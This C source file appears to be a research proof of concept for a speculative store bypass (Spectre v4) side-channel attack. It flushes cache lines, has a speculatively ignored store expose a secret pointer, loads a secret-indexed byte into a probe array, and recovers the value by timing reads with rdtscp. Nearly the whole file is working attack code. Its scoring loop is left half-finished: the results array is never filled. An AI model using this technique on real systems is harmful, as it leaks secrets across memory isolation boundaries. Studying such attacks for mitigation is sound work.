#include "defines.h"
#include "generic_byte_attack.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/io.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/time.h> 
#include <inttypes.h>

// source of high-latency pointer to the memory slot
unsigned char **my_flushy_area[1000];
#define my_flushy (my_flushy_area+500)

// memory slot on which we want bad memory disambiguation
unsigned char *my_memory_slot_area[1000];
#define my_memory_slot (my_memory_slot_area+500)

//                                  0123456789abcdef
//unsigned char secret_read_area[] = "0000011011101011";
unsigned char my_public_read_area[] = "################";

#define REDUCE_FLUSHES

unsigned char my_timey_line_area[0x2000000];
// stored in the memory slot first
#define my_timey_lines (my_timey_line_area + 0x10000)

unsigned char my_dummy_char_sink;

unsigned int* read_byte_from_cache(){
    unsigned int *delay_arr = (unsigned int*)calloc(sizeof(unsigned int), VALUES); 
    unsigned int t1, t2;
    
    for(int i=0; i<VALUES; i++){
        /* Time reads. Mixed-up order to prevent stride prediction */
        int mix_i = ((i * 167) + 13) & 255;
        //mix_i = i;

        pipeline_flush();
        asm volatile(
            "lfence\n\t"
            "rdtscp\n\t"
            "mov %%eax, %%ebx\n\t"
            "mov (%%rdi), %%r11\n\t"
            "rdtscp\n\t"
            "lfence\n\t"
            ://out
            "=a"(t2),
            "=b"(t1)
            ://in
            "D"(my_timey_lines + 0x1000 * mix_i)
            ://clobber
            "r11",
            "rcx",
            "rdx",
            "memory"
        );
        if(mix_i == 35){
            printf("%#010x\n", my_timey_lines + 0x1000 * mix_i);
        }
        pipeline_flush();
        delay_arr[mix_i] = t2 - t1;
    }
    return delay_arr;
}


void generic_byte_testfun(int idx, unsigned char *my_secret_read_area) {
  pipeline_flush();
  *my_flushy = my_memory_slot;
  *my_memory_slot = my_secret_read_area;
  for(int i=0; i<VALUES; i++){
      my_timey_lines[i << 12] = 1;
  }
  //my_timey_lines['0' << 12] = 1;
  //my_timey_lines['1' << 12] = 1;
  pipeline_flush();
  clflush(my_flushy);
    for(int i=0; i<VALUES; i++){
      clflush(&my_timey_lines[i << 12]);
  }
  //clflush(&my_timey_lines['0' << 12]);
  //clflush(&my_timey_lines['1' << 12]);
  asm volatile("mfence");
  pipeline_flush();

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *my_flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its address is unknown
  *memory_slot__slowptr = my_public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ :
/*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible microarchitectural read from timey_line
  my_dummy_char_sink = my_timey_lines[(*my_memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int* delay_arr = read_byte_from_cache();

  for(int i=0; i<VALUES; i++){
      if(delay_arr[i] < HIT_THRESHOLD){
          printf("%i=%i:%i\n", idx,i, delay_arr[i]);
      }
  }
  
}

//return number of correct detected bits
int generic_byte_read(int start_add, int size, unsigned char *my_secret_read_area){
  int correct_bits = 0;
  for (int idx = start_add; idx < size; idx++) {
    pipeline_flush();
    long cycles = 0;
    int hits = 0;
    char results[HIT_LIMIT] = {0};
    /* if we don't break the loop after some time when it doesn't
work, in NO_INTERRUPTS mode with SMP disabled, the machine will lock
up */
    while (hits < HIT_LIMIT && 
    cycles < 1000000) {
      pipeline_flush();
      generic_byte_testfun(idx, my_secret_read_area);

      //int res = testfun(idx);
    //   if (res != -1) {
    //     pipeline_flush();
    //     results[hits] = res + '0';
    //     hits++;
    //   }
        hits++;
      cycles++;
      pipeline_flush();
    }
    int correct = 0;
    for(int i=0; i<HIT_LIMIT; i++){
      if(results[i] == my_secret_read_area[idx])
        correct++;
    }
    if(correct > HIT_LIMIT/2)
      correct_bits++;
//      printf("%c: %s in %ld cycles (hitrate: %f%%)\n",
//   my_secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
    pipeline_flush();
  }
  return correct_bits;
}

void test_generic_byte_read(){
    //0123456789abcdef
    unsigned char secret_read_area[] = {0,1,2,3,40,50,10,62};
    generic_byte_read(0, 8, secret_read_area);
}